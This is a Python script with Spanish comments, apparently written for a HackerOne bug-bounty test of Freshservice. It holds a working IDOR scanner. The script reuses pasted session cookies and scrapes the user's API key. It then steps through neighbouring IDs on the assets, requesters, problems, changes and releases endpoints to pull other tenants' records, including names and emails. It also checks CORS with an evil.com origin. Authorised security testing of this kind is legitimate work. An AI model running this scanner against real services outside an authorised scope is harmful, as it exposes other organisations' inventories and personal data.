#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auditor_freshservice.py — Auditoría IDOR para Freshservice
===========================================================
Freshservice es el producto ITSM de Freshworks (helpdesk interno para empresas).
Mismo scope H1 que Freshdesk pero DISTINTO codebase → diferente superficie.

Endpoints clave de Freshservice (distintos a Freshdesk):
  - /api/v2/assets          ← Inventario de hardware/software (NUEVO)
  - /api/v2/requesters      ← Equivalente a "contacts" en Freshdesk
  - /api/v2/problems        ← Gestión de problemas ITSM (NUEVO)
  - /api/v2/changes         ← Gestión de cambios ITSM (NUEVO)
  - /api/v2/locations       ← Ubicaciones físicas (NUEVO)
  - /api/v2/departments     ← Departamentos de empresa (NUEVO)

Uso: python3 auditor_freshservice.py
"""

import requests
import json
import re
import sys
import time

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN — Actualizar con las cookies del tenant de Freshservice
# ─────────────────────────────────────────────────────────────────────────────
TARGET = "https://TENANT_AQUI.freshservice.com"  # ← reemplazar con tu tenant

HELPKIT_SESSION = "PEGAR_AQUI_HELPKIT_SESSION"
USER_CREDS      = "PEGAR_AQUI_USER_CREDENTIALS"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Bug-Bounty": "HackerOne-tomas244",
    "Accept": "application/json, text/plain, */*",
    "Referer": TARGET,
}

COOKIES = {
    "_helpkit_session": HELPKIT_SESSION,
    "user_credentials": USER_CREDS,
}

sess = requests.Session()
sess.headers.update(HEADERS)
sess.cookies.update(COOKIES)


def sep(titulo=""):
    print(f"\n{'─'*60}")
    if titulo:
        print(f"  {titulo}")
        print(f"{'─'*60}")


def check_auth():
    sep("1. VERIFICANDO AUTENTICACIÓN")
    # Freshservice usa /a/ igual que Freshdesk
    for path in ["/a/tickets", "/helpdesk/tickets", "/"]:
        r = sess.get(f"{TARGET}{path}", allow_redirects=False)
        print(f"  GET {path} → {r.status_code}")
        if r.status_code in [200, 302]:
            print("  ✅ Sesión activa")
            return True
    print("  ❌ Sesión inválida — renovar cookies")
    return False


def extraer_api_key():
    sep("2. EXTRAYENDO API KEY")
    for url_path in ["/a/profile", "/profile", "/helpdesk/profile", "/a/profiles"]:
        r = sess.get(f"{TARGET}{url_path}", allow_redirects=True)
        if r.status_code == 200:
            patrones = [
                r'"api_key"\s*:\s*"([a-zA-Z0-9]+)"',
                r'api[_-]key["\s>:]+([a-zA-Z0-9]{20,})',
                r'data-api-key="([a-zA-Z0-9]+)"',
            ]
            for patron in patrones:
                match = re.search(patron, r.text, re.IGNORECASE)
                if match:
                    key = match.group(1)
                    print(f"  ✅ API Key: {key}")
                    return key
            print(f"  ⚠️  {url_path}: cargó pero key no encontrada")
    print("  ℹ️  Trabajando sin API Key (solo sesión)")
    return None


def mapear_endpoints():
    """
    Freshservice tiene más endpoints que Freshdesk.
    Mapeamos cuáles responden y qué IDs tienen.
    """
    sep("3. MAPEANDO ENDPOINTS FRESHSERVICE")
    endpoints = [
        # Comunes con Freshdesk
        "/api/v2/tickets",
        "/api/v2/agents",
        "/api/v2/groups",
        "/api/v2/roles",
        # Exclusivos de Freshservice ← superficie de ataque extra
        "/api/v2/requesters",       # = contacts en Freshdesk
        "/api/v2/assets",           # Inventario de hardware/software
        "/api/v2/problems",         # ITSM: problemas
        "/api/v2/changes",          # ITSM: cambios
        "/api/v2/releases",         # ITSM: releases
        "/api/v2/locations",        # Ubicaciones físicas
        "/api/v2/departments",      # Departamentos
        "/api/v2/vendors",          # Proveedores
        "/api/v2/products",         # Productos de hardware
        "/api/v2/purchase_orders",  # Órdenes de compra
    ]

    ids_encontrados = {}
    for ep in endpoints:
        try:
            r = sess.get(f"{TARGET}{ep}", allow_redirects=False)
            status = r.status_code
            info = ""
            ids = []
            if status == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        ids = [str(item.get("id", "?")) for item in data[:5] if isinstance(item, dict)]
                        all_ids = [item.get("id") for item in data if isinstance(item, dict) and item.get("id")]
                        ids_encontrados[ep] = all_ids
                        info = f"✅ {len(data)} items — IDs: {', '.join(ids)}"
                    elif isinstance(data, dict):
                        # Algunos endpoints devuelven {tickets: [...]}
                        for key in data:
                            if isinstance(data[key], list) and data[key]:
                                all_ids = [item.get("id") for item in data[key] if isinstance(item, dict) and item.get("id")]
                                ids_encontrados[ep] = all_ids
                                ids = [str(i) for i in all_ids[:5]]
                                info = f"✅ dict[{key}]: {len(data[key])} items — IDs: {', '.join(ids)}"
                                break
                        if not info:
                            info = f"✅ dict con claves: {list(data.keys())[:5]}"
                except Exception:
                    info = f"✅ {len(r.text)} bytes (no-JSON)"
            elif status == 401:
                info = "🔒 Requiere API key (no cookies)"
            elif status == 403:
                info = "🚫 Prohibido"
            elif status == 404:
                info = "❌ Endpoint no existe en Freshservice"
            print(f"  {ep:40s} {status}  {info}")
        except Exception as e:
            print(f"  {ep:40s} ERROR: {e}")

    return ids_encontrados


def test_idor_assets(ids_map):
    """
    Assets es el endpoint más interesante de Freshservice.
    Contiene inventario de laptops, servidores, licencias de software.
    Si hay IDOR acá → información muy sensible de otras empresas.
    """
    sep("4. IDOR EN ASSETS (Inventario de hardware/software)")
    asset_ids = ids_map.get("/api/v2/assets", [])

    if not asset_ids:
        print("  ⚠️  No se encontraron assets propios. Creá un asset primero.")
        print("  Admin → Asset Management → New Asset")
        return []

    print(f"  Nuestros asset IDs: {asset_ids}")
    min_id = min(asset_ids)
    print(f"  Testeando IDs vecinos alrededor de {min_id}...\n")

    NUESTROS = set(asset_ids)
    # Testear ±50 IDs alrededor del nuestro más bajo
    rango = range(min_id - 50, min_id + 50)

    hallazgos = []
    for aid in rango:
        time.sleep(0.3)
        try:
            r = sess.get(f"{TARGET}/api/v2/assets/{aid}")
            es_nuestro = aid in NUESTROS
            if r.status_code == 200:
                data = r.json()
                nombre = data.get("name", data.get("asset_tag", "?"))
                tipo = data.get("asset_type_id", "?")
                marker = "✅ PROPIO" if es_nuestro else "🚨 IDOR CROSS-TENANT"
                print(f"  [{aid}] {marker}: '{nombre}' (tipo: {tipo})")
                if not es_nuestro:
                    hallazgos.append({"id": aid, "data": data})
            elif r.status_code == 404:
                pass  # Normal
            elif r.status_code == 429:
                print(f"  [{aid}] ⏳ Rate limit — pausando 5s...")
                time.sleep(5)
            elif r.status_code not in [404]:
                print(f"  [{aid}] HTTP {r.status_code}")
        except Exception as e:
            print(f"  [{aid}] ERROR: {e}")

    if hallazgos:
        print(f"\n  🚨 IDOR ASSETS: {len(hallazgos)} assets ajenos accesibles!")
    else:
        print("\n  ✅ Assets correctamente aislados por tenant")
    return hallazgos


def test_idor_requesters(ids_map):
    """Requesters = Contacts en Freshdesk. Mismo test, diferente endpoint."""
    sep("5. IDOR EN REQUESTERS")
    requester_ids = ids_map.get("/api/v2/requesters", [])

    if not requester_ids:
        print("  ⚠️  Sin requesters propios encontrados")
        return []

    print(f"  Nuestros requester IDs: {requester_ids[:5]}")
    min_id = min(requester_ids)
    rango = range(min_id - 30, min_id + 30)
    NUESTROS = set(requester_ids)
    hallazgos = []

    for rid in rango:
        time.sleep(0.3)
        try:
            r = sess.get(f"{TARGET}/api/v2/requesters/{rid}")
            es_nuestro = rid in NUESTROS
            if r.status_code == 200:
                data = r.json()
                nombre = data.get("first_name", "?") + " " + data.get("last_name", "")
                email = data.get("primary_email", "?")
                marker = "✅ PROPIO" if es_nuestro else "🚨 IDOR CROSS-TENANT"
                print(f"  [{rid}] {marker}: {nombre} / {email}")
                if not es_nuestro:
                    hallazgos.append({"id": rid, "nombre": nombre, "email": email})
            elif r.status_code == 429:
                print(f"  [{rid}] ⏳ Rate limit — pausando 5s...")
                time.sleep(5)
        except Exception as e:
            print(f"  [{rid}] ERROR: {e}")

    if hallazgos:
        print(f"\n  🚨 IDOR REQUESTERS: {len(hallazgos)} ajenos accesibles!")
    else:
        print("\n  ✅ Requesters correctamente aislados")
    return hallazgos


def test_idor_itsm(ids_map):
    """
    Testea IDOR en los endpoints exclusivos de ITSM:
    problems, changes, releases — IDs probablemente globales.
    """
    sep("6. IDOR EN ENDPOINTS ITSM (Problems / Changes / Releases)")
    itsm_endpoints = {
        "problems": "/api/v2/problems",
        "changes": "/api/v2/changes",
        "releases": "/api/v2/releases",
    }

    hallazgos = []
    for nombre, ep in itsm_endpoints.items():
        ids = ids_map.get(ep, [])
        if not ids:
            print(f"  {nombre:12s}: sin IDs propios (el tenant está vacío para este recurso)")
            continue

        print(f"\n  {nombre.upper()} — nuestros IDs: {ids}")
        min_id = min(ids)
        NUESTROS = set(ids)

        for rid in range(min_id - 10, min_id + 10):
            time.sleep(0.3)
            try:
                r = sess.get(f"{TARGET}{ep}/{rid}")
                es_nuestro = rid in NUESTROS
                if r.status_code == 200:
                    data = r.json()
                    titulo = data.get("subject", data.get("name", data.get("title", "?")))
                    marker = "✅ PROPIO" if es_nuestro else "🚨 IDOR"
                    print(f"    [{rid}] {marker}: '{titulo}'")
                    if not es_nuestro:
                        hallazgos.append({"tipo": nombre, "id": rid, "data": data})
                elif r.status_code == 429:
                    time.sleep(5)
            except Exception as e:
                print(f"    [{rid}] ERROR: {e}")

    if hallazgos:
        print(f"\n  🚨 IDOR ITSM: {len(hallazgos)} recursos ajenos!")
    else:
        print("\n  ✅ ITSM correctamente aislado (o sin datos propios para comparar)")
    return hallazgos


def test_cors():
    sep("7. TEST CORS")
    endpoints = ["/api/v2/tickets", "/api/v2/requesters", "/api/v2/assets", "/api/v2/agents"]
    print("  Leyenda: ACAO=Access-Control-Allow-Origin | ACAC=Allow-Credentials\n")
    for ep in endpoints:
        r = sess.get(f"{TARGET}{ep}", headers={"Origin": "https://evil.com"})
        acao = r.headers.get("Access-Control-Allow-Origin", "—")
        acac = r.headers.get("Access-Control-Allow-Credentials", "—")
        refleja = (acao == "https://evil.com")
        wildcard_creds = (acao == "*" and acac == "true")
        vulnerable = refleja or wildcard_creds
        marker = "🚨 VULNERABLE" if vulnerable else ("⚠️  wildcard" if acao == "*" else "✅ OK")
        print(f"  {ep:35s} ACAO={acao:20s} ACAC={acac:6s} {marker}")


def main():
    if "TENANT_AQUI" in TARGET or "PEGAR_AQUI" in HELPKIT_SESSION:
        print("❌ Configurar TARGET, HELPKIT_SESSION y USER_CREDS antes de correr.")
        sys.exit(1)

    print("=" * 60)
    print("  AUDITOR FRESHSERVICE — IDOR Tester")
    print(f"  Target: {TARGET}")
    print("=" * 60)

    if not check_auth():
        sys.exit(1)

    extraer_api_key()
    ids_map = mapear_endpoints()

    test_idor_assets(ids_map)
    test_idor_requesters(ids_map)
    test_idor_itsm(ids_map)
    test_cors()

    sep("RESUMEN")
    print("  Revisá los 🚨 arriba. Cualquier 200 en recurso ajeno = reportable.")
    print("=" * 60)


if __name__ == "__main__":
    main()
